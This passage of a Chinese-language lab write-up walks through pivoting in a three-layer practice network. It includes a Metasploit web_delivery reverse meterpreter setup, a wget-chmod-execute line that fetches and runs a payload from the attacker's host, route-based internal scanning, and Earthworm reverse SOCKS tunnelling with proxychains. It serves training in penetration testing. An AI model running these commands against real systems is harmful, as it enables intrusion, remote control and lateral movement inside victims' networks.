+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2010.41.47.png" style="zoom:40%;">
+
+<blockquote>
+<h4 id="配置解析："><a href="#配置解析：" class="headerlink" title="配置解析："></a>配置解析：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">server <span class="token punctuation">{</span>
+    listen <span class="token number">81</span><span class="token punctuation">;</span>             <span class="token comment"># 监听端口 81，这意味着 Nginx 将在这个端口上接收进来的 HTTP 请求。</span>
+    server_name localhost<span class="token punctuation">;</span> <span class="token comment"># 指定服务器名称为 localhost，这通常用于本地开发和测试环境。</span>
+
+    location / <span class="token punctuation">{</span>           <span class="token comment"># 定义 location 块，它决定了如何处理对服务器根路径（即以 / 开始的路径）的请求。</span>
+        proxy_pass http://192.168.52.20:8000<span class="token punctuation">;</span> <span class="token comment"># 将请求转发到内部网络的 192.168.52.20 服务器的 8000 端口。</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>到目前为止我们已经拿下了：</p>
+<ul>
+<li>DMZ区的一台服务器（192.168.43.253，192.168.52.10）</li>
+<li>二层网络的一台服务器（192.168.52.20，192.168.93.10）</li>
+</ul>
+<h1 id="六、二层网络渗透"><a href="#六、二层网络渗透" class="headerlink" title="六、二层网络渗透"></a>六、二层网络渗透</h1><p>目前攻击机只能ping通DMZ区的主机，无法ping通二层网络（192.168.52.20/24）的主机。如何把我们的工具带入内网呢？比如如何直接拿kali上的nmap扫192.168.52.0/24网段的主机？这就要用到隧道搭建技术了。</p>
+<p>关于EW和proxychains的使用方法，可以参考本站的《Earthworm-隧道搭建》一文。</p>
+<h2 id="6-1-通过设置路由将msfconsole带入内网使用"><a href="#6-1-通过设置路由将msfconsole带入内网使用" class="headerlink" title="6.1 通过设置路由将msfconsole带入内网使用"></a>6.1 通过设置路由将msfconsole带入内网使用</h2><p>虽然通过获取web1和web2的metepreter的shell，然后通过路由设置可以将msfconsole带入内网（但是其他的工具想要带入内网还是要搭建隧道）。</p>
+<p>使用 msf exploit/multi/script/web_delivery模块创建反弹shell的payload，投递到DMZ受控主机中。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery
+<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span>
+<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.43.26
+<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> SRVPORT <span class="token number">9090</span>
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在web1中执行下面的命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> xDfaOgFL --no-check-certificate http://192.168.43.26:9090/plurgt4DqlP<span class="token punctuation">;</span> <span class="token function">chmod</span> +x xDfaOgFL<span class="token punctuation">;</span> ./xDfaOgFL<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.54.38.png" alt="截屏2025-01-15 15.54.38"></p>
+<p> 执行之后上线meterpreter：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.55.00.png" style="zoom:40%;">
+
+<p>设置路由：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2015.56.25.png" style="zoom:50%;">
+
+<p>通过添加路由可以将msfconsole路由到内网中。将msfconsole的流量从sessions 1路由到192.168.52.0/24网段。</p>
+<p>我们尝试使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe
+<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.1-255
+<span class="token builtin class-name">set</span> threads <span class="token number">5</span>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.03.09.png" alt="截屏2025-01-15 16.03.09" style="zoom:50%;">
+
+<p>​       成功探测到一台计算机：192.168.52.30.</p>
+<h2 id="6-2-攻击机通过EW隧道直接探测二层网络"><a href="#6-2-攻击机通过EW隧道直接探测二层网络" class="headerlink" title="6.2 攻击机通过EW隧道直接探测二层网络"></a>6.2 攻击机通过EW隧道直接探测二层网络</h2><p>虽然通过路由设置可以将msfconsole带入内网，但是其他的工具想要带入内网还是要搭建隧道。</p>
+<h3 id="6-2-1-环境梳理"><a href="#6-2-1-环境梳理" class="headerlink" title="6.2.1 环境梳理"></a>6.2.1 环境梳理</h3><p>从攻击者的视角看，目前的网络环境大致如下：</p>
+<p>【攻击机192.168.43.26】——&gt;【DMZ 192.168.43.253｜192.168.52.10)】——&gt;【二层 192.168.52.20｜192.168.93.10】</p>
+<p>这里是在本机搭建的环境，在实际攻击场景中攻击机一般是互联网上一台拥有公网ip的VPS，DMZ对外的IP也是互联网IP。</p>
+<p>需求：建立攻击机和二层主机的隧道，实现直接在攻击机中使用nmap对二层网络中的主机进行扫描。</p>
+<h3 id="6-2-2-攻击机执行ew客户端"><a href="#6-2-2-攻击机执行ew客户端" class="headerlink" title="6.2.2 攻击机执行ew客户端"></a>6.2.2 攻击机执行ew客户端</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>命令详解：</p>
+<ul>
+<li><code>-s rcsocks</code>：指定使用 <code>rcsocks</code> 模式。<code>rcsocks</code> 模式是 Earthworm 的 SOCKS 代理模式，它创建一个 SOCKS 服务器，该服务器接收来自客户端的连接，并将这些连接转发到远程的 SOCKS 服务器。</li>
+<li><code>-l 1080</code>：指定本地监听端口为 1080。这意味着 Earthworm 将在本地计算机的 1080 端口上监听进来的 SOCKS 代理请求。</li>
+<li><code>-e 1234</code>：指定远程 SOCKS 服务器的端口为 1234。这意味着所有通过本地 SOCKS 服务器（监听在 1080 端口）的流量都将被转发到远程 SOCKS 服务器的 1234 端口。</li>
+</ul>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.04.59.png" style="zoom:50%;">
 
 
+
+<h3 id="6-2-3-DMZ受控主机执行ew服务端（web1）"><a href="#6-2-3-DMZ受控主机执行ew服务端（web1）" class="headerlink" title="6.2.3 DMZ受控主机执行ew服务端（web1）"></a>6.2.3 DMZ受控主机执行ew服务端（web1）</h3><blockquote>
+<p>上传ew_for_linux64</p>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.40.28.png" style="zoom:50%;">
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> Desktop/ew_for_linux64 root@192.168.43.253:/home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.06.10.png" style="zoom:50%;">
+
+<p>由于已经获得了ssh root权限，所以这里可以直接用scp复制文件到目标系统中。</p>
+<blockquote>
+<p>并执行如下命令：</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.43.26 <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>命令详解：</p>
+<ul>
+<li><code>-s rssocks</code>：指定使用 <code>rssocks</code> 模式。<code>rssocks</code> 模式用于创建一个 SOCKS 服务端，它将接收来自远程 SOCKS 客户端的连接，并将这些连接转发到本地的特定端口。</li>
+<li><code>-d 192.168.1.7</code>：指定目标主机的 IP 地址为 <code>192.168.1.7</code>。这意味着 Earthworm 将尝试连接到这个 IP 地址上的 SOCKS 客户端。</li>
+<li><code>-e 1234</code>：指定本地转发端口为 1234。这意味着所有通过远程 SOCKS 客户端的流量都将被转发到本地的 1234 端口。</li>
+</ul>
+</blockquote>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.42.40.png" style="zoom:50%;">
+
+<h3 id="6-2-4-攻击机设置proxychains"><a href="#6-2-4-攻击机设置proxychains" class="headerlink" title="6.2.4 攻击机设置proxychains"></a>6.2.4 攻击机设置proxychains</h3><blockquote>
+<h4 id="什么是proxychains"><a href="#什么是proxychains" class="headerlink" title="什么是proxychains"></a>什么是proxychains</h4><p>Proxychains 是一个非常有用的工具，它允许你通过一个或多个代理服务器来运行你的应用程序。它通过劫持应用程序的网络请求，并将这些请求通过配置的代理链发送出去，从而实现网络流量的代理。</p>
+<p>ProxyChains是Linux和其他Unices下的代理工具。它可以使任何程序通过代理上网，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4和SOCKS5类型的代理服务器，并且可配置多个代理。</p>
+<p>设置ProxyChains的具体操作步骤如下所示：</p>
+<p>1）打开ProxyChains配置文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2）添加代理服务器</p>
+<p>在配置文件中，找到 <code>[ProxyList]</code> 部分，并添加你的代理服务器信息。以下是一些示例配置：</p>
+<p><strong>SOCKS5 代理</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.100 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>HTTP 代理</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">http 192.168.1.101 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>SOCKS4 代理</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">socks4 192.168.1.102 9050<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>你可以添加多个代理，Proxychains 会根据配置的规则使用这些代理。</p>
+<p>3）配置代理链模式</p>
+<p>在配置文件的顶部，你可以选择不同的代理链模式：</p>
+<p>动态链 (<code>dynamic_chain</code>)**：Proxychains 将按顺序尝试每个代理，直到找到一个工作的代理。</p>
+<p>**严格链 (<code>strict_chain</code>)**：Proxychains 将按顺序尝试每个代理，如果一个代理失败，它将停止尝试。</p>
+<p>例如，要启用动态链模式，你可以在配置文件的顶部添加或确保以下行未被注释（即没有 <code>#</code> 在行首）：</p>
+<pre class="line-numbers language-none"><code class="language-none">dynamic_chain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>4）保存并退出编辑器</p>
+<p>保存更改并退出编辑器。如果你使用的是 <code>nano</code>，可以按 <code>Ctrl + X</code>，然后按 <code>Y</code> 确认保存更改，最后按 <code>Enter</code> 保存文件。</p>
+<p>5）使用 Proxychains</p>
+<p>现在，你可以通过在命令前加上 <code>proxychains</code> 来使用 Proxychains。例如，使用 <code>proxychains</code> 运行 <code>curl</code> 命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这将通过你配置的代理服务器发送请求。</p>
+</blockquote>
+<p>修改之前的配置：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.08.png" style="zoom:50%;">
+
